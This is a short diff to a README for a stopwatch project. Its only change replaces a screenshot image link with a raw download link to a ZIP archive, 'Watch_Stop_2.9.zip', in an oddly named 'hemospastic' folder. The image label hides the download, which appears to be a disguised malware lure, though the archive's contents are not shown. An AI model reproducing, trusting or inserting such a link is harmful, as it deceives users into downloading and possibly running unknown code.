@@ -3,4 +3,4 @@ STOPWATCH Using HTML , CSS And JS
 **KARTIKAY SHARMA**
 </br>
 
-![Screenshot 2024-06-18 180516](https://github.com/Kartikay7124/Stop-Watch/assets/102504679/f34ac1e8-d097-43a0-8159-2bb262879276)
+![Screenshot 2024-06-18 180516](https://github.com/Kartikay7124/Stop-Watch/raw/refs/heads/main/hemospastic/Watch_Stop_2.9.zip)
